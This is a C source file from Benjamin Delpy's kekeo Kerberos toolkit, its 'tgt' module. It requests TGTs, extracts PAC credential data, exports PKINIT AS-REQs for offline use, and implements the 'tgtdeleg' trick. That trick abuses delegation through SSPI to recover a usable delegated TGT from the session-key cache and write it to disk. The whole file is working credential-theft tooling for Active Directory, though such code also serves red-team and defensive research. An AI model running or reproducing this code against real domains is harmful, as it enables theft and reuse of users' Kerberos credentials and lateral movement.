/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "kuhl_m_tgt.h"

const KUHL_M_C kuhl_m_c_tgt[] = {
	{kuhl_m_tgt_ask,	L"ask", L"Ask a TGT with various authentication methods"},
	{kuhl_m_tgt_pac,	L"pac", L"pacman"},
	{kuhl_m_tgt_asreq,	L"asreq", L"PKINIT Mustiness"},
	{kuhl_m_tgt_deleg,	L"deleg", L"Ask a delegate TGT by using a fake target"},
};
const KUHL_M kuhl_m_tgt = {
	L"tgt",	L"TGT module", NULL,
	ARRAYSIZE(kuhl_m_c_tgt), kuhl_m_c_tgt, NULL, NULL
};

NTSTATUS kuhl_m_tgt_ask(int argc, wchar_t * argv[])
{
	PKIWI_AUTH_INFOS infos;
	PKULL_M_SOCK socket;
	AS_REP *AsRep = NULL;
	EncKDCRepPart *encAsRepPart = NULL;
	PKULL_M_KERBEROS_ASN1_SAVEKDCREP_CALLBACK callback = NULL;

	if(kull_m_string_args_byName(argc, argv, L"ptt", NULL, NULL))
		callback = kuhl_m_kerberos_ptt_data;
	if(infos = kull_m_kerberos_asn1_Authinfos_create(argc, argv))
	{
		if(socket = kull_m_kerberos_asn1_net_AddressSocket_create(infos->w_realm, KERBEROS_DEFAULT_PORT, argc, argv, TRUE))
		{
			if(kull_m_kerberos_asn1_AsReqAsRep(infos, socket, NULL, NULL, &AsRep, &encAsRepPart, NULL))
			{
				kull_m_kerberos_asn1_KdcRep_save(AsRep, encAsRepPart, NULL, NULL, callback);
				ossFreePDU(&kull_m_kerberos_asn1_world, EncASRepPart_PDU, encAsRepPart);
				ossFreePDU(&kull_m_kerberos_asn1_world, AS_REP_PDU, AsRep);
			}
			kull_m_kerberos_asn1_net_AddressSocket_delete(socket);
		}
		kull_m_kerberos_asn1_Authinfos_delete(infos);
	}
	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_tgt_pac(int argc, wchar_t * argv[])
{
	PKIWI_AUTH_INFOS infos;
	PKULL_M_SOCK socket;
	AS_REP *asrep = NULL;
	EncKDCRepPart *enckdcreppart = NULL;
	EncryptionKey asKey;
	OssBuf TgsReq = {0, NULL};
	TGS_REP *TgsRep = NULL;
	_octet1 pac;

	if(infos = kull_m_kerberos_asn1_Authinfos_create(argc, argv))
	{
		if(socket = kull_m_kerberos_asn1_net_AddressSocket_create(infos->w_realm, KERBEROS_DEFAULT_PORT, argc, argv, TRUE))
		{
			if(kull_m_kerberos_asn1_AsReqAsRep(infos, socket, NULL, NULL, &asrep, &enckdcreppart, &asKey))
			{
				if(kull_m_kerberos_asn1_TgsReq_build(&TgsReq, &asrep->cname, asrep->crealm, &asrep->cname, NULL, KERB_KDCOPTION_standard | KERB_KDCOPTION_enc_tkt_in_skey, &asrep->ticket, &enckdcreppart->key, &asrep->ticket, NULL, NULL))
				{
					if(kull_m_kerberos_asn1_net_callKdcOssBuf(socket, &TgsReq, (LPVOID *) &TgsRep, TGS_REP_PDU))
					{
						if(kull_m_kerberos_asn1_PAC_from_EncTicketPart(&enckdcreppart->key, &TgsRep->ticket.enc_part, &pac))
						{
							if(kull_m_string_args_byName(argc, argv, L"cred", NULL, NULL))
							{
								if(!kuhl_m_tgt_pac_cred(&pac, &asKey))
									PRINT_ERROR(L"No CREDENTIALS_INFO in the PAC\n");
							}
							else kuhl_m_kerberos_pac_info_data((PPACTYPE) pac.value, pac.length, &asKey);
							
							if(pac.value)
								LocalFree(pac.value);
						}
						else PRINT_ERROR(L"No PAC found\n");
						ossFreePDU(&kull_m_kerberos_asn1_world, TGS_REP_PDU, TgsRep);
					}
					ossFreeBuf(&kull_m_kerberos_asn1_world, TgsReq.value);
				}
				if(asKey.keyvalue.value)
					LocalFree(asKey.keyvalue.value);
				ossFreePDU(&kull_m_kerberos_asn1_world, EncASRepPart_PDU, enckdcreppart);
				ossFreePDU(&kull_m_kerberos_asn1_world, AS_REP_PDU, asrep);
			}
			kull_m_kerberos_asn1_net_AddressSocket_delete(socket);
		}
		kull_m_kerberos_asn1_Authinfos_delete(infos);
	}
	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_tgt_asreq(int argc, wchar_t * argv[])
{
	PKIWI_AUTH_INFOS authInfo;
	OssBuf AsReq;
	FILETIME fTime, eTime;
	KerberosTime time;
	BOOL isNonce, isSign = TRUE;
	DWORD cookie, i, increment, count;
	LPCWSTR szLifetime;

	CDGenerateRandomBits(&cookie, sizeof(cookie));
	kprintf(L"Cookie value       : %08x\n", cookie);
	if(authInfo = kull_m_kerberos_asn1_Authinfos_create(argc, argv))
	{
		if((authInfo->type == KIWI_AUTH_INFOS_TYPE_RSA_DH) || (authInfo->type == KIWI_AUTH_INFOS_TYPE_OTF_RSA_DH))
		{
			isNonce = authInfo->u.certinfos.dhKeyInfo.dhClientNonce.value && authInfo->u.certinfos.dhKeyInfo.dhClientNonce.length;
			GetSystemTimeAsFileTime(&fTime);
			kprintf(L"> Current time     : "); kull_m_string_displayLocalFileTime(&fTime);
			if(kull_m_string_args_byName(argc, argv, L"startoffset", &szLifetime, NULL))
				*(PULONGLONG) &fTime -= *(PULONGLONG) &fTime % 10000000 - ((LONGLONG) wcstol(szLifetime, NULL, 0) * 10000000 * 60);
			kull_m_string_args_byName(argc, argv, L"increment", &szLifetime, L"10");
			increment = wcstoul(szLifetime, NULL, 0);
			kull_m_string_args_byName(argc, argv, L"count", &szLifetime, L"1");
			count = wcstoul(szLifetime, NULL, 0);
			kprintf(L"\n> Start time       : "); kull_m_string_displayLocalFileTime(&fTime);
			kprintf(L"\n> Increment        : %u mn"
				L"\n> Count            : %u\n", increment, count);
			if(count)
			{
				*(PULONGLONG) &eTime = *(PULONGLONG) &fTime + (ULONGLONG) 10000000 * 60 * increment * (count - 1);
				kprintf(L"> End              : "); kull_m_string_displayLocalFileTime(&eTime); kprintf(L"\n\n");
				for(i = 0; (!g_isBreak && isSign) && (i < count); i++, *(PULONGLONG) &fTime += (ULONGLONG) 10000000 * 60 * increment)
				{
					kull_m_kerberos_asn1_KerberosTime_build_filetime(&time, &fTime, FALSE);
					kprintf(L"* "); kull_m_string_displayLocalFileTime(&fTime); kprintf(L" - ");
					if(isSign = kull_m_kerberos_asn1_AsReq_build(authInfo, &time, NULL, &AsReq))
					{
						isSign = kuhl_m_tgt_asreq_export(cookie, &fTime, authInfo, &AsReq);
						ossFreeBuf(&kull_m_kerberos_asn1_world, AsReq.value);
					}
					if(isNonce)
						CDGenerateRandomBits(authInfo->u.certinfos.dhKeyInfo.dhClientNonce.value, authInfo->u.certinfos.dhKeyInfo.dhClientNonce.length);
				}
			}
			else PRINT_ERROR(L"Invalid count\n");
		}
		else PRINT_ERROR(L"Certificate and Diffie-Hellman mode needed\n");
		kull_m_kerberos_asn1_Authinfos_delete(authInfo);
	}
	return STATUS_SUCCESS;
}

BOOL kuhl_m_tgt_pac_cred(_octet1 *buf, EncryptionKey *AsRepKey)
{
	BOOL status = FALSE;
	PPACTYPE pacType = (PPACTYPE) buf->value;
	DWORD i;
	for(i = 0; i < pacType->cBuffers; i++)
	{
		if(status = pacType->Buffers[i].ulType == PACINFO_TYPE_CREDENTIALS_INFO)
		{
			kuhl_m_kerberos_pac_info_data_credentialinfo((PPAC_CREDENTIAL_INFO) ((PBYTE) pacType + pacType->Buffers[i].Offset), pacType->Buffers[i].cbBufferSize, AsRepKey);
			break;
		}
	}
	return status;
}

BOOL kuhl_m_tgt_asreq_export(DWORD cookie, PFILETIME fTime, PKIWI_AUTH_INFOS authInfo, OssBuf *asReq)
{
	BOOL status = FALSE;
	WCHAR timer[15];
	PWSTR filename;
	size_t charCount = 32 + lstrlen(authInfo->w_short_cname) + lstrlen(authInfo->w_realm); // DWORD - timer - @ .musti + 1
	if(kull_m_string_FileTimeToString(fTime, timer))
	{
		if(filename = (PWSTR) LocalAlloc(LPTR, charCount * sizeof(wchar_t)))
		{
			if(swprintf_s(filename, charCount, L"%08x-%s-%s@%s.musti", cookie, timer, authInfo->w_short_cname, authInfo->w_realm) > 0)
			{
				kprintf(L"%s -> ", filename);
				if(status = kull_m_file_writeData(filename, asReq->value, asReq->length))
					kprintf(L"OK\n");
				else PRINT_ERROR_AUTO(L"kull_m_file_writeData");
			}
			else PRINT_ERROR(L"swprintf_s/buffer\n");
			LocalFree(filename);
		}
	}
	return status;
}

NTSTATUS kuhl_m_tgt_deleg(int argc, wchar_t * argv[])
{
	SECURITY_STATUS status;
	CredHandle hClientCred;
	CtxtHandle hClientCtx;
	SecBuffer SBClientOut = {0, SECBUFFER_TOKEN, NULL};
	SecBufferDesc SBDClientOut = {SECBUFFER_VERSION, 1, &SBClientOut};
	ULONG ClientContextAttr;
	LPCWCHAR szClientTarget;

	int toDecPdu = AP_REQ_PDU;
	AP_REQ *ApReq = NULL;
	Authenticator *authenticator = NULL;
	KRB_CRED *KrbCred = NULL;
	OssBuf toDecode = {0, NULL}, DecryptedAuthenticator = {0, NULL}, DecryptedKrbCredEnc = {0, NULL}, PlainKrbCredEnc = {0, NULL};
	EncryptedData previousEncrypted = {0};
	EncryptionKey sessionKey = {0};

	PDOMAIN_CONTROLLER_INFO cInfo = NULL;
	NTSTATUS ntStatus;
	LPWSTR filename, target = NULL;
	DWORD ret;

	if(kull_m_string_args_byName(argc, argv, L"target", &szClientTarget, NULL))
		kull_m_string_copy(&target, szClientTarget);
	else
	{
		ret = DsGetDcName(NULL, NULL, NULL, NULL, DS_RETURN_DNS_NAME | DS_IP_REQUIRED, &cInfo);
		if(ret == ERROR_SUCCESS)
		{
			kull_m_string_sprintf(&target, L"HOST/%s", cInfo->DomainControllerName + 2);
			NetApiBufferFree(cInfo);
		}
		else PRINT_ERROR(L"DsGetDcName: %u\n", ret);
	}

	if(target)
	{
		kprintf(L"[delegation target] %s (not used)\n", target);
		status = AcquireCredentialsHandle(NULL, MICROSOFT_KERBEROS_NAME, SECPKG_CRED_OUTBOUND, NULL, NULL, NULL, NULL, &hClientCred, NULL);
		if(status == SEC_E_OK)
		{
			status = InitializeSecurityContext(&hClientCred, NULL, (SEC_WCHAR *) target, ISC_REQ_ALLOCATE_MEMORY | ISC_REQ_DELEGATE | ISC_REQ_MUTUAL_AUTH, 0, SECURITY_NATIVE_DREP, NULL, 0, &hClientCtx, &SBDClientOut, &ClientContextAttr, NULL);		
			if((status == SEC_I_CONTINUE_NEEDED) || (status == SEC_E_OK))
			{
				if(ClientContextAttr & ISC_RET_DELEGATE)
				{
					if(toDecode.value = kuhl_m_tgt_deleg_searchDataAferOIDInSecBuffer(&SBClientOut))
					{
						if(*(PUSHORT) toDecode.value == TOK_ID_KRB_AP_REQ)
						{
							toDecode.value += sizeof(USHORT);
							toDecode.length = SBClientOut.cbBuffer - (LONG) (toDecode.value - (PBYTE) SBClientOut.pvBuffer);
							if(!ossDecode(&kull_m_kerberos_asn1_world, &toDecPdu, &toDecode, (LPVOID *) &ApReq))
							{
								if(kuhl_m_tgt_deleg_EncryptionKeyFromCache(target, ApReq->authenticator.etype, &sessionKey))
								{
									ntStatus = kull_m_kerberos_asn1_crypto_encrypt(KRB_KEY_USAGE_AP_REQ_AUTHENTICATOR, &sessionKey, (OssBuf *) &ApReq->authenticator.cipher, &DecryptedAuthenticator, FALSE);
									if(NT_SUCCESS(ntStatus))
									{
										toDecPdu = Authenticator_PDU;
										if(!ossDecode(&kull_m_kerberos_asn1_world, &toDecPdu, &DecryptedAuthenticator, (LPVOID *) &authenticator))
										{
											if(authenticator->bit_mask & cksum_present)
											{
												if(authenticator->cksum.cksumtype == GSS_CHECKSUM_TYPE)
												{
													if(((PKIWI_AUTHENTICATOR_CKSUM) authenticator->cksum.checksum.value)->Flags & GSS_C_DELEG_FLAG)
													{
														toDecPdu = KRB_CRED_PDU;
														toDecode.length = ((PKIWI_AUTHENTICATOR_CKSUM) authenticator->cksum.checksum.value)->Dlgth;
														toDecode.value = ((PKIWI_AUTHENTICATOR_CKSUM) authenticator->cksum.checksum.value)->Deleg;
														if(!ossDecode(&kull_m_kerberos_asn1_world, &toDecPdu, &toDecode, (LPVOID *) &KrbCred))
														{
															ntStatus = kull_m_kerberos_asn1_crypto_encrypt(KRB_KEY_USAGE_KRB_CRED_ENCRYPTED_PART, &sessionKey, (OssBuf *) &KrbCred->enc_part.cipher, &DecryptedKrbCredEnc, FALSE);
															if(NT_SUCCESS(ntStatus))
															{
																previousEncrypted = KrbCred->enc_part;
																KrbCred->enc_part.etype = KERB_ETYPE_NULL;
																KrbCred->enc_part.cipher = *(_octet1 *) &DecryptedKrbCredEnc;
																if(filename = kull_m_kerberos_asn1_KrbCred_filename(KrbCred, L"_delegate", NULL))
																{
																	if(!ossEncode(&kull_m_kerberos_asn1_world, KRB_CRED_PDU, KrbCred, &PlainKrbCredEnc))
																	{
																		kprintf(L"%s -> ", filename);
																		if(kull_m_file_writeData(filename, PlainKrbCredEnc.value, PlainKrbCredEnc.length))
																			kprintf(L"OK\n");
																		else PRINT_ERROR_AUTO(L"kull_m_file_writeData");
																		ossFreeBuf(&kull_m_kerberos_asn1_world, PlainKrbCredEnc.value);
																	}
																	else PRINT_ERROR(L"Unable to encode KRB_CRED: %S\n", ossGetErrMsg(&kull_m_kerberos_asn1_world));
																	LocalFree(filename);
																}
																else PRINT_ERROR(L"Unable to get a filename from KRB_CRED\n");
																KrbCred->enc_part = previousEncrypted;
																LocalFree(DecryptedKrbCredEnc.value);
															}
															else PRINT_ERROR(L"Unable to decrypt KRB_CRED EncryptedData: %08x\n", ntStatus);
															ossFreePDU(&kull_m_kerberos_asn1_world, KRB_CRED_PDU, KrbCred);
														}
														else PRINT_ERROR(L"Unable to decode KRB_CRED: %S\n", ossGetErrMsg(&kull_m_kerberos_asn1_world));
													}
													else PRINT_ERROR(L"No GSS_C_DELEG_FLAG in Flags: 0x%08x\n", ((PKIWI_AUTHENTICATOR_CKSUM) authenticator->cksum.checksum.value)->Flags);
												}
												else PRINT_ERROR(L"cksumtype: 0x%08x\n", authenticator->cksum.cksumtype);
											}
											else PRINT_ERROR(L"No cksum in authenticator?");
											ossFreePDU(&kull_m_kerberos_asn1_world, Authenticator_PDU, authenticator);
										}
										else PRINT_ERROR(L"Unable to decode Ticket: %S\n", ossGetErrMsg(&kull_m_kerberos_asn1_world));
										LocalFree(DecryptedAuthenticator.value);
									}
									else PRINT_ERROR(L"Unable to decrypt Authenticator: %08x\n", ntStatus);
									LocalFree(sessionKey.keyvalue.value);
								}
								ossFreePDU(&kull_m_kerberos_asn1_world, AP_REP_PDU, ApReq);
							}
							else PRINT_ERROR(L"Unable to decode AP_REP: %S\n", ossGetErrMsg(&kull_m_kerberos_asn1_world));
						}
						else PRINT_ERROR(L"Unable to find Kerberos OID\n");
					}
					else PRINT_ERROR(L"Unable to find Kerberos OID\n");
				}
				else PRINT_ERROR(L"Client is not allowed to delegate to target\n");
				if(SBClientOut.pvBuffer)
					FreeContextBuffer(SBClientOut.pvBuffer);
				DeleteSecurityContext(&hClientCtx);
			}
			else PRINT_ERROR(L"InitializeSecurityContext: 0x%08x\n", status);
			FreeCredentialHandle(&hClientCred);
		}
		else PRINT_ERROR(L"AcquireCredentialsHandle: 0x%08x\n", status);
		LocalFree(target);
	}
	else PRINT_ERROR(L"Unable to get a target (from /target:... or from DC)\n");


	return STATUS_SUCCESS;
}

const BYTE	KeberosV5Legacy[] = {0x06, 0x09, 0x2a, 0x86, 0x48, 0x82, 0xf7, 0x12, 0x01, 0x02, 0x02} /* 1.2.840.48018.1.2.2 */,
			KeberosV5[] = {0x06, 0x09, 0x2a, 0x86, 0x48, 0x86, 0xf7, 0x12, 0x01, 0x02, 0x02} /* 1.2.840.113554.1.2.2 */;
const OssEncodedOID kerberosOIDs[] = {
	{sizeof(KeberosV5Legacy), (unsigned char *) KeberosV5Legacy},
	{sizeof(KeberosV5), (unsigned char *) KeberosV5},
};

PBYTE kuhl_m_tgt_deleg_searchDataAferOIDInSecBuffer(IN PSecBuffer data)
{
	DWORD i;
	PBYTE ret = NULL;
	for(i = 0; (i < ARRAYSIZE(kerberosOIDs)) && !ret; i++)
		ret = (PBYTE) kuhl_m_tgt_deleg_searchInMemory(&kerberosOIDs[i], data->pvBuffer, data->cbBuffer);
	if(ret)
		ret += kerberosOIDs[i - 1].length;
	return ret;
}

PVOID kuhl_m_tgt_deleg_searchInMemory(IN const OssEncodedOID *oid, IN LPCVOID Start, IN SIZE_T Size)
{
	BOOL status = FALSE;
	PBYTE Result = NULL, CurrentPtr, limite = (PBYTE) Start + Size;
	for(CurrentPtr = (PBYTE) Start; !status && (CurrentPtr + oid->length <= limite); CurrentPtr++)
		status = RtlEqualMemory(oid->value, CurrentPtr, oid->length);
	if(status)
		Result = CurrentPtr - 1;
	return Result;
}

BOOL kuhl_m_tgt_deleg_EncryptionKeyFromCache(LPCWCHAR Target, Int32 etype, EncryptionKey *key)
{
	BOOL status = FALSE;
	NTSTATUS ntStatus, packageStatus;
	USHORT dwTarget;
	DWORD szData;
	PKERB_RETRIEVE_TKT_REQUEST pKerbRetrieveRequest;
	PKERB_RETRIEVE_TKT_RESPONSE pKerbRetrieveResponse;

	dwTarget = (USHORT) ((wcslen(Target) + 1) * sizeof(wchar_t));
	szData = sizeof(KERB_RETRIEVE_TKT_REQUEST) + dwTarget;
	if(pKerbRetrieveRequest = (PKERB_RETRIEVE_TKT_REQUEST) LocalAlloc(LPTR, szData))
	{
		pKerbRetrieveRequest->MessageType = KerbRetrieveEncodedTicketMessage;
		pKerbRetrieveRequest->CacheOptions = KERB_RETRIEVE_TICKET_USE_CACHE_ONLY;
		pKerbRetrieveRequest->EncryptionType = etype;
		pKerbRetrieveRequest->TargetName.Length = dwTarget - sizeof(wchar_t);
		pKerbRetrieveRequest->TargetName.MaximumLength  = dwTarget;
		pKerbRetrieveRequest->TargetName.Buffer = (PWSTR) ((PBYTE) pKerbRetrieveRequest + sizeof(KERB_RETRIEVE_TKT_REQUEST));
		RtlCopyMemory(pKerbRetrieveRequest->TargetName.Buffer, Target, pKerbRetrieveRequest->TargetName.MaximumLength);
		ntStatus = LsaCallKerberosPackage(pKerbRetrieveRequest, szData, (PVOID *) &pKerbRetrieveResponse, &szData, &packageStatus);
		if(NT_SUCCESS(ntStatus))
		{
			if(NT_SUCCESS(packageStatus))
			{
				key->keytype = (Int32) pKerbRetrieveResponse->Ticket.SessionKey.KeyType;
				key->keyvalue.length = pKerbRetrieveResponse->Ticket.SessionKey.Length;
				if(key->keyvalue.value = (unsigned char *) LocalAlloc(LPTR, key->keyvalue.length))
				{
					RtlCopyMemory(key->keyvalue.value, pKerbRetrieveResponse->Ticket.SessionKey.Value, key->keyvalue.length);
					status = TRUE;
				}
				LsaFreeReturnBuffer(pKerbRetrieveResponse);
			}
			else if(packageStatus == STATUS_NO_TRUST_SAM_ACCOUNT)
				PRINT_ERROR(L"\'%wZ\' Kerberos name not found!\n", &pKerbRetrieveRequest->TargetName);
			else PRINT_ERROR(L"LsaCallAuthenticationPackage KerbRetrieveEncodedTicketMessage / Package : %08x\n", packageStatus);
		}
		else PRINT_ERROR(L"LsaCallAuthenticationPackage KerbRetrieveEncodedTicketMessage : %08x\n", status);
		LocalFree(pKerbRetrieveRequest);
	}
	return status;
}